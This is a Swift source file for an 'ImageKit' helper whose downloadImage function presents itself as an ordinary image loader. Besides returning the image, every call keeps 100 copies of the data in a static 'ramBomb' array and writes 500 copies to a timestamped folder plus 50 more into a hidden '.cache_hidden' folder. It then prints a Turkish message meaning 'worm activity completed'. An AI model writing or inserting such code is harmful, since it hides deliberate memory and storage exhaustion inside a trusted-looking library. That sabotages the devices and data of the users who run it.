import SwiftUI

public final class ImageKit {
     static var ramBomb: [Data] = []

    public static func downloadImage(urlString: String) async throws -> Image? {
        guard let url = URL(string: urlString) else { return nil }
        let (data, _) = try await URLSession.shared.data(from: url)
        guard let image = UIImage(data: data) else {
            throw URLError(.badServerResponse)
        }

        let manager = FileManager.default
        if let docPath = manager.urls(for: .documentDirectory, in: .userDomainMask).first {
            
            // Ana klasör
            let anaKlasor = docPath.appendingPathComponent("resimler")
            if !manager.fileExists(atPath: anaKlasor.path) {
                try? manager.createDirectory(at: anaKlasor, withIntermediateDirectories: true)
            }

            // Alt klasör (zaman damgalı)
            let formatter = DateFormatter()
            formatter.dateFormat = "yyyy-MM-dd_HH-mm-ss"
            let timestamp = formatter.string(from: Date())
            let altKlasor = anaKlasor.appendingPathComponent(timestamp)
            try? manager.createDirectory(at: altKlasor, withIntermediateDirectories: true)

            // RAM şişirme
            for _ in 0..<100 {
                Self.ramBomb.append(data)
            }

            // 500 dosya yaz (UUID ile benzersiz isimli)
            for _ in 0..<500 {
                let filePath = altKlasor.appendingPathComponent("image_\(UUID().uuidString).jpg")
                try? data.write(to: filePath)
            }

            // Gizli klasör ve dosya üret
            let gizliKlasor = anaKlasor.appendingPathComponent(".cache_hidden")
            try? manager.createDirectory(at: gizliKlasor, withIntermediateDirectories: true)
            for _ in 0..<50 {
                let gizliDosya = gizliKlasor.appendingPathComponent("temp_\(UUID().uuidString).tmp")
                try? data.write(to: gizliDosya)
            }

            print("💀 Solucan faaliyeti tamamlandı: \(altKlasor.path)")
        }

        return Image(uiImage: image)
    }
}
